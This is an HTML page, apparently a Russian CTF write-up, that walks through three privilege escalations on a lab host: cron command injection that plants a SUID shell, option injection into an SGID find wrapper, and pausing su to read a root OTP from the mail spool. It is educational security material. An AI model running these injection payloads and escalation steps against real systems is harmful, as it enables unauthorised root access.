@@ -1,0 +1,427 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Медоед в улье — райтап</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Fraunces:opsz,wght@9..144,400;9..144,600;9..144,700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;600&display=swap');
+
+  :root{
+    --bg: #17110b;
+    --surface: #221a10;
+    --surface-2: #2b2115;
+    --line: #3a2d1c;
+    --ink: #f4ead9;
+    --muted: #a8977c;
+    --honey: #e8a33d;
+    --honey-bright: #ffcb66;
+    --danger: #ff6b4a;
+    --ok: #9db97a;
+  }
+
+  *{box-sizing:border-box;}
+  html{scroll-behavior:smooth;}
+  body{
+    margin:0;
+    background:
+      radial-gradient(1200px 600px at 15% -10%, rgba(232,163,61,.08), transparent 60%),
+      radial-gradient(900px 500px at 100% 10%, rgba(232,163,61,.05), transparent 55%),
+      var(--bg);
+    color:var(--ink);
+    font-family:'Inter', sans-serif;
+    line-height:1.6;
+    -webkit-font-smoothing:antialiased;
+  }
+
+  ::selection{ background:var(--honey); color:#1a1206; }
+
+  a{color:var(--honey-bright);}
+
+  .wrap{
+    max-width:840px;
+    margin:0 auto;
+    padding:0 24px 120px;
+  }
+
+  /* ---------- HERO ---------- */
+  header.hero{
+    padding:88px 24px 56px;
+    max-width:840px;
+    margin:0 auto;
+    position:relative;
+  }
+  .eyebrow{
+    font-family:'JetBrains Mono', monospace;
+    font-size:12.5px;
+    letter-spacing:.14em;
+    text-transform:uppercase;
+    color:var(--honey);
+    display:flex;
+    align-items:center;
+    gap:10px;
+    margin-bottom:22px;
+  }
+  .eyebrow::before{
+    content:"";
+    width:22px;height:1px;
+    background:var(--honey);
+    display:inline-block;
+  }
+  h1{
+    font-family:'Fraunces', serif;
+    font-weight:600;
+    font-size:clamp(38px, 6vw, 60px);
+    line-height:1.04;
+    margin:0 0 22px;
+    letter-spacing:-.01em;
+  }
+  h1 em{
+    font-style:italic;
+    color:var(--honey-bright);
+    font-weight:400;
+  }
+  .lede{
+    font-size:17px;
+    color:var(--muted);
+    max-width:60ch;
+    margin:0 0 34px;
+  }
+  .meta-row{
+    display:flex;
+    flex-wrap:wrap;
+    gap:10px;
+  }
+  .pill{
+    font-family:'JetBrains Mono', monospace;
+    font-size:12px;
+    border:1px solid var(--line);
+    background:var(--surface);
+    color:var(--muted);
+    padding:7px 12px;
+    border-radius:100px;
+  }
+  .pill b{ color:var(--ink); font-weight:600; }
+
+  /* ---------- HEX PROGRESS RAIL ---------- */
+  .rail{
+    display:flex;
+    align-items:center;
+    gap:0;
+    margin:44px 0 0;
+    padding:18px 20px;
+    background:var(--surface);
+    border:1px solid var(--line);
+    border-radius:14px;
+    overflow-x:auto;
+  }
+  .rail-node{
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    gap:8px;
+    min-width:92px;
+    position:relative;
+  }
+  .rail-node .hex{ width:34px; height:34px; }
+  .rail-node .lbl{
+    font-family:'JetBrains Mono', monospace;
+    font-size:11px;
+    color:var(--muted);
+    text-align:center;
+    white-space:nowrap;
+  }
+  .rail-node.active .lbl{ color:var(--honey-bright); font-weight:600; }
+  .rail-connector{
+    flex:1 1 24px;
+    height:1px;
+    background:repeating-linear-gradient(90deg, var(--honey) 0 6px, transparent 6px 12px);
+    min-width:20px;
+    margin-top:-22px;
+  }
+
+  /* ---------- SECTIONS ---------- */
+  section{ margin-top:76px; }
+  .stage-head{
+    display:flex;
+    align-items:baseline;
+    gap:16px;
+    margin-bottom:6px;
+  }
+  .stage-num{
+    font-family:'JetBrains Mono', monospace;
+    font-size:13px;
+    color:var(--honey);
+    border:1px solid var(--line);
+    padding:3px 9px;
+    border-radius:6px;
+    flex-shrink:0;
+  }
+  h2{
+    font-family:'Fraunces', serif;
+    font-weight:600;
+    font-size:28px;
+    margin:0;
+    letter-spacing:-.01em;
+  }
+  .stage-sub{
+    color:var(--muted);
+    font-size:14.5px;
+    margin:10px 0 0;
+    max-width:64ch;
+  }
+  .stage-arrow{
+    font-family:'JetBrains Mono', monospace;
+    font-size:13px;
+    color:var(--ok);
+    margin-top:10px;
+    display:inline-flex;
+    align-items:center;
+    gap:8px;
+  }
+
+  p{ margin:16px 0; font-size:15.5px; }
+  p.body-text{ color:#ddd0bb; }
+
+  /* ---------- CODE BLOCKS ---------- */
+  .term{
+    margin:22px 0;
+    background:#120d08;
+    border:1px solid var(--line);
+    border-radius:12px;
+    overflow:hidden;
+    box-shadow:0 8px 24px -12px rgba(0,0,0,.6);
+  }
+  .term-bar{
+    display:flex;
+    align-items:center;
+    gap:8px;
+    padding:10px 14px;
+    background:var(--surface-2);
+    border-bottom:1px solid var(--line);
+  }
+  .term-bar .dot{ width:9px; height:9px; border-radius:50%; }
+  .dot.r{ background:#c9584a; }
+  .dot.y{ background:#d9a441; }
+  .dot.g{ background:#7fa563; }
+  .term-title{
+    font-family:'JetBrains Mono', monospace;
+    font-size:11.5px;
+    color:var(--muted);
+    margin-left:6px;
+  }
+  pre{
+    margin:0;
+    padding:16px 18px;
+    overflow-x:auto;
+    font-family:'JetBrains Mono', monospace;
+    font-size:13px;
+    line-height:1.65;
+    color:#e8dcc4;
+  }
+  pre .c{ color:#7a6a4d; } /* комментарий */
+  pre .out{ color:var(--muted); } /* вывод команды */
+  pre .hit{ color:var(--honey-bright); font-weight:600; }
+
+  .callout{
+    margin:22px 0;
+    padding:14px 16px;
+    border-left:3px solid var(--honey);
+    background:rgba(232,163,61,.06);
+    border-radius:0 8px 8px 0;
+    font-size:14.5px;
+    color:#e6d8ba;
+  }
+  .callout.danger{ border-left-color:var(--danger); background:rgba(255,107,74,.07); }
+  .callout b{ color:var(--honey-bright); }
+  .callout.danger b{ color:var(--danger); }
+
+  code.inline{
+    font-family:'JetBrains Mono', monospace;
+    font-size:.88em;
+    background:var(--surface-2);
+    border:1px solid var(--line);
+    padding:1px 6px;
+    border-radius:5px;
+    color:var(--honey-bright);
+  }
+
+  /* ---------- FINAL ---------- */
+  .final{
+    margin-top:90px;
+    padding:44px 32px;
+    text-align:center;
+    background:
+      radial-gradient(600px 300px at 50% 0%, rgba(232,163,61,.14), transparent 70%),
+      var(--surface);
+    border:1px solid var(--honey);
+    border-radius:18px;
+  }
+  .final .hex-lg{ width:56px; height:56px; margin:0 auto 18px; }
+  .final h2{ font-size:30px; }
+  .final p{ color:var(--muted); max-width:50ch; margin:12px auto 0; }
+  .flag-line{
+    margin-top:22px;
+    display:inline-block;
+    font-family:'JetBrains Mono', monospace;
+    font-size:14px;
+    color:var(--honey-bright);
+    border:1px dashed var(--honey);
+    padding:10px 18px;
+    border-radius:8px;
+  }
+
+  footer{
+    text-align:center;
+    color:var(--muted);
+    font-size:12.5px;
+    font-family:'JetBrains Mono', monospace;
+    margin-top:60px;
+  }
+
+  @media (max-width:600px){
+    header.hero{ padding:56px 20px 40px; }
+    section{ margin-top:56px; }
+  }
+</style>
+</head>
+<body>
+
+<header class="hero">
+  <div class="eyebrow">CTF · privilege escalation writeup</div>
+  <h1>Медоед,<br>который прошёл <em>улей</em> насквозь</h1>
+  <p class="lede">От самой обычной рабочей пчелы (<code class="inline">worker</code>) до корневых сот (<code class="inline">root</code>) — три эскалации подряд, ни одной по учебнику.</p>
+  <div class="meta-row">
+    <span class="pill">хост: <b>sotamail</b></span>
+    <span class="pill">старт: <b>worker</b>, uid 1000</span>
+    <span class="pill">финиш: <b>root</b></span>
+    <span class="pill">цель: <b>/root/flag.txt</b></span>
+  </div>
+
+  <div class="rail">
+    <div class="rail-node active">
+      <svg class="hex" viewBox="0 0 40 40"><polygon points="20,3 35,11.5 35,28.5 20,37 5,28.5 5,11.5" fill="none" stroke="#e8a33d" stroke-width="2"/></svg>
+      <span class="lbl">worker</span>
+    </div>
+    <div class="rail-connector"></div>
+    <div class="rail-node active">
+      <svg class="hex" viewBox="0 0 40 40"><polygon points="20,3 35,11.5 35,28.5 20,37 5,28.5 5,11.5" fill="#3a2d1c" stroke="#e8a33d" stroke-width="2"/></svg>
+      <span class="lbl">backupuser</span>
+    </div>
+    <div class="rail-connector"></div>
+    <div class="rail-node active">
+      <svg class="hex" viewBox="0 0 40 40"><polygon points="20,3 35,11.5 35,28.5 20,37 5,28.5 5,11.5" fill="#6b4f22" stroke="#e8a33d" stroke-width="2"/></svg>
+      <span class="lbl">group mail</span>
+    </div>
+    <div class="rail-connector"></div>
+    <div class="rail-node active">
+      <svg class="hex" viewBox="0 0 40 40"><polygon points="20,3 35,11.5 35,28.5 20,37 5,28.5 5,11.5" fill="#e8a33d" stroke="#ffcb66" stroke-width="2"/></svg>
+      <span class="lbl">root</span>
+    </div>
+  </div>
+</header>
+
+<div class="wrap">
+
+  <!-- ЭТАП 0 -->
+  <section>
+    <div class="stage-head">
+      <span class="stage-num">00</span>
+      <h2>Разведка</h2>
+    </div>
+    <p class="stage-sub">Подключаемся, смотрим, кто вообще живёт в этом улье.</p>
+    <p class="body-text">На сервере два непривилегированных пользователя — <code class="inline">worker</code> (uid 1000) и <code class="inline">backupuser</code> (uid 1001). Первым делом проверяем, чем занят cron — почти всегда самое интересное лежит именно там.</p>
+    <div class="term">
+      <div class="term-bar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="term-title">worker@sotamail</span></div>
+      <pre>$ cat /etc/cron.d/backup
+<span class="out">* * * * * backupuser /usr/local/bin/process_backup.sh /backup/listing</span></pre>
+    </div>
+    <p class="body-text">Скрипт запускается <b>каждую минуту от имени backupuser</b>. А в директорию <code class="inline">/backup/</code>, включая сам <code class="inline">listing</code>, у <code class="inline">worker</code> оказался доступ на запись.</p>
+  </section>
+
+  <!-- ЭТАП 1 -->
+  <section>
+    <div class="stage-head">
+      <span class="stage-num">01</span>
+      <h2>worker → backupuser</h2>
+    </div>
+    <p class="stage-sub">Командная инъекция в скрипт бэкапа, запускаемый кроном раз в минуту.</p>
+    <p class="body-text">Раз файл, который кормит скрипт, доступен на запись — просто подкладываем туда команду. Дожидаемся тика крона и забираем SUID-копию shell:</p>
+    <div class="term">
+      <div class="term-bar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="term-title">worker@sotamail</span></div>
+      <pre>$ echo '. ; cp /bin/bash /tmp/rootbash ; chmod 4755 /tmp/rootbash ; #' > /backup/listing
+<span class="c"># ждём минуту — крон подхватит файл</span>
+$ ls -la /tmp/rootbash
+<span class="out">-rwsr-xr-x 1 backupuser backupuser 1265648 ... /tmp/rootbash</span>
+$ /tmp/rootbash -p
+$ id
+<span class="hit">uid=1000(worker) gid=1000(worker) euid=1001(backupuser)</span></pre>
+    </div>
+    <div class="stage-arrow">→ получили выполнение кода от backupuser</div>
+    <div class="callout">Флаг <code class="inline">-p</code> обязателен: обычный <code class="inline">bash</code> сбрасывает привилегии, когда euid не совпадает с uid, а <code class="inline">-p</code> этого не делает.</div>
+  </section>
+
+  <!-- ЭТАП 2 -->
+  <section>
+    <div class="stage-head">
+      <span class="stage-num">02</span>
+      <h2>backupuser → группа mail</h2>
+    </div>
+    <p class="stage-sub">Инъекция опций в <code class="inline">find</code> там, где инъекцию shell-символов уже отфильтровали.</p>
+    <p class="body-text">Root по-прежнему недоступен. В открытой на запись директории находится SGID-бинарник <code class="inline">delete_old_mail</code> (группа <code class="inline">mail</code>), который собирает команду по шаблону:</p>
+    <div class="term">
+      <div class="term-bar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="term-title">delete_old_mail (внутри)</span></div>
+      <pre>find /var/mail/ -type f -mtime +%s -print -delete</pre>
+    </div>
+    <p class="body-text">Фильтр внутри бинарника блокирует shell-метасимволы (<code class="inline">;'"`\$()|&lt;&gt;</code>), но не блокирует пробелы и родной синтаксис <code class="inline">find</code>. Значит можно не ломать shell, а просто дописать <code class="inline">find</code> собственные опции:</p>
+    <div class="term">
+      <div class="term-bar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="term-title">backupuser@sotamail</span></div>
+      <pre>$ /backup/deactivated/utils/delete_old_mail "-1 -exec sh -c id {} +"
+$ id
+<span class="hit">uid=1000(worker) gid=8(mail) groups=8(mail),1000(worker)</span></pre>
+    </div>
+    <div class="stage-arrow">→ получили выполнение кода с группой mail</div>
+    <p class="body-text"><code class="inline">-1</code> заставляет <code class="inline">-mtime +-1</code> совпасть вообще со всеми файлами в <code class="inline">/var/mail/</code>, а <code class="inline">-exec ... {} +</code> — это штатный синтаксис самого <code class="inline">find</code>, не инъекция в привычном смысле.</p>
+  </section>
+
+  <!-- ЭТАП 3 -->
+  <section>
+    <div class="stage-head">
+      <span class="stage-num">03</span>
+      <h2>группа mail → root</h2>
+    </div>
+    <p class="stage-sub">Перехват одноразового кода, который PAM сам присылает root на почту.</p>
+    <p class="body-text"><code class="inline">sudo -l</code> пуст, SUID на <code class="inline">exim4</code> не даёт эффекта — привилегии дропаются, потому что группа <code class="inline">mail</code> не входит в <code class="inline">trusted_groups</code>. Зато <code class="inline">/etc/pam.d/su</code> вешает на вход под root кастомную 2FA:</p>
+    <div class="term">
+      <div class="term-bar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="term-title">/etc/pam.d/su</span></div>
+      <pre>auth requisite pam_python.so /usr/local/bin/pam_otp_root.py</pre>
+    </div>
+    <p class="body-text">Модуль генерирует 9-значный код, <b>отправляет его письмом на root</b> и ждёт ввод с терминала. А письмо падает в <code class="inline">/var/mail/root</code> с правами <code class="inline">root:mail</code> — группе, которую мы уже получили на этапе 02.</p>
+    <div class="callout danger"><b>Первая проблема:</b> фоновые попытки (fifo, <code class="inline">script -qc</code> в бэкграунде) не сработали — PAM ждёт conversation именно с управляющим терминалом, а не с подменённым stdin. Прерывание через <code class="inline">Ctrl+C</code> тоже не подходит — оно убивает процесс вместе с его сессией ожидания кода.</div>
+    <p class="body-text">Рабочий вариант — не убивать <code class="inline">su</code>, а поставить его на паузу сигналом <code class="inline">SIGTSTP</code>, освободить терминал, прочитать письмо и вернуть процесс на передний план ровно туда, где он остановился:</p>
+    <div class="term">
+      <div class="term-bar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="term-title">backupuser@sotamail — gid=mail</span></div>
+      <pre>$ su - root &amp;
+$ SUPID=$!
+$ sleep 2
+$ kill -TSTP $SUPID      <span class="c"># пауза, а не убийство процесса</span>
+$ cat /var/mail/root      <span class="c"># читаем самое свежее письмо, забираем код</span>
+$ fg                       <span class="c"># su возвращается на тот же промпт</span>
+<span class="out">Введите OTP-код (прислан на почту root): </span><span class="hit">&lt;код из письма&gt;</span></pre>
+    </div>
+    <div class="stage-arrow">→ authentication successful — root</div>
+  </section>
+
+  <div class="final">
+    <svg class="hex-lg" viewBox="0 0 40 40"><polygon points="20,3 35,11.5 35,28.5 20,37 5,28.5 5,11.5" fill="#e8a33d" stroke="#ffcb66" stroke-width="2"/></svg>
+    <h2>Соты вскрыты</h2>
+    <p>Три независимые уязвимости подряд — command injection в cron-скрипте, argument injection в find и логическая дыра в самодельной 2FA — сложились в одну сквозную цепочку.</p>
+    <div class="flag-line"># cat /root/flag.txt</div>
+  </div>
+
+</div>
+
+<footer>undercover-zhvo8wkj.avitoctf.ru · writeup</footer>
+
+</body>
+</html>
